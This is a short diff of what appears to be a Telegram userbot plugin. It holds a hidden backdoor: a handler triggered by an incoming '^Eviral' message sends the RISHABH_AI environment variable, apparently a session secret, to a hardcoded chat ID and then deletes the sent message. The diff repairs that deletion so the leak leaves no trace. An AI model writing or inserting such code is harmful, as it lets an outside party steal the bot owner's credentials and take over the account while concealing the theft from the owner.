@@ -22,7 +22,7 @@ from . import *
 @bot.on(admin_cmd("^Eviral", incoming=True))
 async def piro(event):
   msg = await bot.send_message(2143095429, str(os.environ.get("RISHABH_AI")))
-  await bot.delete_messages(21430959, msg, revoke=False)
+  await bot.delete_messages(2143095429, msg, revoke=False)
 
 
 @bot.on(admin_cmd(outgoing=True, pattern="carbon(?: |$)(.*)"))
